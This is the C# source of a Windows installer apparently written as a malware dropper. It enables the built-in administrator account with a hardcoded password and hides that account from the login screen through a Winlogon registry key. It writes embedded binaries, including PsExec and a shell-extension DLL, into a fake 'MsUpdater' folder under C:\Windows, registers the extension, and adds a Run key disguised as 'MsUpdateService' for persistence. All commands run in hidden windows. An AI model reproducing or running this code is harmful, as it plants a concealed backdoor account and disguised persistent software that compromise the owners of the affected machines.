namespace Expander
{
    using System;
    using System.Diagnostics;
    using System.IO;

    using Expander.Properties;

    using Microsoft.Win32;

    internal static class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            const string Administrator = "administrator";
            const string Password = "abc123kappa";

            CommandPrompt($"net user {Administrator} /active:yes").WaitForExit();
            CommandPrompt($"net user {Administrator} {Password}").WaitForExit();

            Directory.CreateDirectory(@"C:\Windows\MsUpdater\ShellEx");

            const string Target = @"C:\Windows\MsUpdater\Bootstrap.exe";
            File.WriteAllBytes(Target, Resources.Bootstrap);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\InputSimulator.dll", Resources.InputSimulator);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\PsExec64.exe", Resources.PsExec64);

            const string SparkExecution = @"C:\Windows\MsUpdater\ShellEx\SparkExecution.dll";
            File.WriteAllBytes(SparkExecution, Resources.SparkExecution);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\LogicNP.EZShellExtensions.dll", Resources.LogicNP_EZShellExtensions);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\register.exe", Resources.register);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\restart.exe", Resources.RestartExplorer);

            CommandPrompt(@"C:\Windows\MsUpdater\ShellEx\register.exe -i C:\Windows\MsUpdater\ShellEx\SparkExecution.dll").WaitForExit();

            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                // ReSharper disable PossibleNullReferenceException

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    key.CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue(Administrator, 0);
                }

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.SetValue("MsUpdateService", Target);
                }

                // ReSharper restore PossibleNullReferenceException
            }
        }

        private static Process CommandPrompt(string args)
        {
            return Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/C {args}",
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
    }
}